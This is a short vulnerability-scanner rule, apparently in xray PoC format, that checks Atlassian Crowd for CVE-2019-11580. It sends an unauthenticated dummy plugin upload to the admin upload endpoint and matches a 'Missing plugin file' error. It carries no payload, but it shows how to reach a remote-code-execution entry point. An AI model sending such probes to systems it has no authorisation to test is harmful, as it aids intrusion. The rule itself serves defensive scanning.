name: poc-yaml-atlassiancrowd-rce-cve-2019-11580
rules:
  - method: POST
    path: /crowd/admin/uploadplugin.action
    headers:
      Content-Type: >-
        multipart/form-data;boundary=--------------------------030909570995894093305230
    body: |-
      ----------------------------030909570995894093305230
      Content-Disposition: form-data; name=""; filename="abcde.jar"
      Content-Type: application/java-archive
      123
      ----------------------------030909570995894093305230--
    follow_redirects: false
    expression: >
      response.status == 400 &&response.body.bcontains(bytes("Missing plugin file")) &&response.body.bcontains(bytes("description"))
detail:
  author: su(https://suzzz112113.github.io/#blog)
  links:
    -  https://blog.csdn.net/caiqiiqi/article/details/96285653
    -  https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html